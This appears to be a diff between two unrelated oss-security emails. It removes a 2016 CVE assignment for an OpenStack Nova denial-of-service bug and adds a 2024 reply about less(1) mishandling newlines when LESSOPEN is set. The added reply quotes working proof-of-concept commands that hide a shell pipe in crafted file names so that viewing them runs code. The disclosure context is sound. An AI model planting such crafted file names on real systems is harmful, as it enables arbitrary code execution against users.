@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1820" "Wednesday" "21" "September" "2016" "12:29:50" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160921162950.B2DF572E020@smtpvbsrv1.mitre.org>" "47" "[oss-security] Re: CVE request for vulnerability in OpenStack Nova" nil nil nil "9" "2016092116:29:50" "[oss-security] Re: CVE request for vulnerability in OpenStack Nova" (number mark "U       cve-assign@m Sep 21   47/1820  " thread-indent "\"[oss-security] Re: CVE request for vulnerability in OpenStack Nova\"\n") "<f4140eea-595f-612b-8875-36d117aedeb0@redhat.com>" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 1837 invoked by uid 550); 21 Sep 2016 16:30:03 -0000
+Received: (qmail 18331 invoked by uid 550); 12 Apr 2024 15:45:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,59 +7,86 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 1817 invoked from network); 21 Sep 2016 16:30:02 -0000
-From: cve-assign@mitre.org
-To: tdecacqu@redhat.com
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-In-Reply-To: <f4140eea-595f-612b-8875-36d117aedeb0@redhat.com>
-Message-Id: <20160921162950.B2DF572E020@smtpvbsrv1.mitre.org>
-Date: Wed, 21 Sep 2016 12:29:50 -0400 (EDT)
-Subject: [oss-security] Re: CVE request for vulnerability in OpenStack Nova
+Received: (qmail 31890 invoked from network); 12 Apr 2024 12:42:23 -0000
+From: Sam James <sam@gentoo.org>
+To: oss-security@lists.openwall.com
+In-Reply-To: <20240412122031.pt2sx6rasca3mgpu@jwilk.net> (Jakub Wilk's message
+	of "Fri, 12 Apr 2024 14:20:31 +0200")
+Organization: Gentoo
+References: <20240412122031.pt2sx6rasca3mgpu@jwilk.net>
+User-Agent: mu4e 1.12.3; emacs 30.0.50
+Date: Fri, 12 Apr 2024 13:42:05 +0100
+Message-ID: <87frvqvjky.fsf@gentoo.org>
+MIME-Version: 1.0
+Content-Type: multipart/signed; boundary="=-=-=";
+	micalg=pgp-sha512; protocol="application/pgp-signature"
+Subject: Re: [oss-security] less(1) with LESSOPEN mishandles \n in paths
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+--=-=-=
+Content-Type: text/plain
 
-> Title: Nova may fail to delete images in resize state regression
-> Affects: ==13.0.0
-> 
-> If an
-> authenticated user deletes an instance while it is in resize state, it
-> will cause the original instance to not be deleted from the compute node
-> it was running on. An attacker can use this to launch a denial of
-> service attack. All Nova setups are affected.
-> 
-> This bug is similar to OSSA-2015-017 (CVE-2015-3280) and was
-> re-introduced in the first release of Mitaka version of Nova and it was
-> re-fixed in nova-13.1.0.
-> 
-> https://launchpad.net/bugs/1589821
+Jakub Wilk <jwilk@jwilk.net> writes:
 
->> cleanup_incomplete_migrations periodic task regression with commit
->> 099cf53925c0a0275325339f21932273ee9ce2bc
+> less(1) does not correctly escape newlines in pathnames when
+> constructing command line of the input preprocessor. If a user ran
+> less(1) on files with untrusted names, this could result in execution
+> of arbitrary code.
+>
+> The input preprocessor is enabled by the LESSOPEN environment variable.
+> But if you didn't set it, don't worry, because zless(1) (or xzless(1),
+> or zstdless(1)) sets it for you:
+>
+>    $ echo 'cowsay pwned' > './\' && touch "$(printf '\n|sh')"
+>    $ zless ./*
+>     _______
+>    < pwned >
+>     -------
+>            \   ^__^
+>             \  (oo)\_______
+>                (__)\       )\/\
+>                    ||----w |
+>                    ||     ||
+>    ./
+>    |sh (file 1 of 2) (END) - Next: ./\
+>
+> On Ubuntu systems, $LESSOPEN is set in ~/.bashrc by default, so the
+> bug can be exploited even without the wrapper:
+>
 
->> This reverts commit 099cf53925c0a0275325339f21932273ee9ce2bc.
+Unfortunately, it looks like we're the same in Gentoo.
 
-Use CVE-2016-7498.
+>    $ mkdir m "$(printf '\n|m')" && touch "$(printf '\n|m/oo')" && echo 'cowsay pwned' > m/oo && chmod +x m/oo
+>    $ less ./*/*
+>     _______
+>    < pwned >
+>     -------
+>            \   ^__^
+>             \  (oo)\_______
+>                (__)\       )\/\
+>                    ||----w |
+>                    ||     ||
+>    ./
+>    |m/oo (file 1 of 2) (END) - Next: ./m/oo
+>
+>
+> Upstream fix:
+> https://github.com/gwsw/less/commit/007521ac3c95bc76
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
+Thanks.
+
+Any idea if upstream plan to backport it? It doesn't apply cleanly I
+think to the last release 643 (653 is a beta) but I'll try do it now.
+
+--=-=-=
+Content-Type: application/pgp-signature; name="signature.asc"
+
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQIcBAEBCAAGBQJX4rTJAAoJEHb/MwWLVhi2XbYQAJyHRL8m6k3pOx7KnR0yhb3r
-UaUcM8iKeJlbL218NgqOcMt0TEhwq6MmhWAWWoa6ptVoVGuriZuuzEXA9QcrgEIU
-GF2PEN5umuD6XDP2kqg7InlP1DkGyCU4j5nu4vqg5h31oxuxedQ2kROzUUZbeDew
-6fyMpay+suYOTc2eQaP86kTqrx69B/zm0K1agR49Z1dDF/+B0J/HiPAXV+3tmwRy
-XfbtQyZwIfLF4wbFmPZVMYuUZqXZhM0piRdFwmkjTiF3Wkf5neo50+qZnU3N8g7b
-izWhpemQ+LhZdPEiS2XX7xB+xhZHyGxDrBXdEsf4dEc2NdpjQ4vr/fgk4c41XCvM
-2DTtNQLAiTfq5P5KoFS0loAkzTH4H3IRk9iBA9ta2bK6IdDN9arZOwAdxXEgx8Ju
-gdoGqGcX9dKrIqo7EMB8u2cM6pdz4BZQqJw6ceXXjBcc+ai46C+6NqwMlTnyYLs2
-7gFr6J/RqQpWfQDDZA2LzQbSEFzEJhR3J6eHO/0KuPGMzFVWcAWXJPa1b99ZwTjF
-fcGD56XcbJROXbSb+kPxj7kw29k5/1rxaY4qXiWXpvsBXI4juLHH7l2lVMmlLXZ6
-xmyNlBIEs/tE3xnj541xAVODZjYkYNiLqvwZaNk/TAiIJ5E85IIp+Eg9r0+OxpuH
-kh4a4OUoAvv//hPZkckh
-=b3GM
+iOUEARYKAI0WIQQlpruI3Zt2TGtVQcJzhAn1IN+RkAUCZhksHl8UgAAAAAAuAChp
+c3N1ZXItZnByQG5vdGF0aW9ucy5vcGVucGdwLmZpZnRoaG9yc2VtYW4ubmV0MjVB
+NkJCODhERDlCNzY0QzZCNTU0MUMyNzM4NDA5RjUyMERGOTE5MA8cc2FtQGdlbnRv
+by5vcmcACgkQc4QJ9SDfkZBlLgD9E/Up0KBsCb///qqZluDTTOGw546saP3JnC/Q
+kyTe/OkA/0NDUknaG+GTIBXdiZhxZy9WnIBjYy157uf/8f9m/pcO
+=o3er
 -----END PGP SIGNATURE-----
+--=-=-=--
